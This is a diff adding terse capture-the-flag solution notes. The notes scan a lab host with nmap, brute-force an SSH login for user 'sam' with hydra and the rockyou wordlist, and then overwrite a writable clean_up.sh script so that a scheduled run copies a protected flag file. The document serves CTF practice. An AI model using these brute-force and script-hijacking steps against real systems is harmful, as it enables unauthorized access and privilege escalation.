@@ -1,0 +1,8 @@
+nmap IP -p0-10000
+hydra -l sam -P rockyou.txt 10.10.77.2 ssh -t 4 -I -s 4567 -V
+after logging in, cd ../scripts
+nano clean_up.sh
+replace the script with 
+cat /home/ubuntu/flag2.txt > /home/scripts/flag2.txt
+wait
+cat flag2.txt
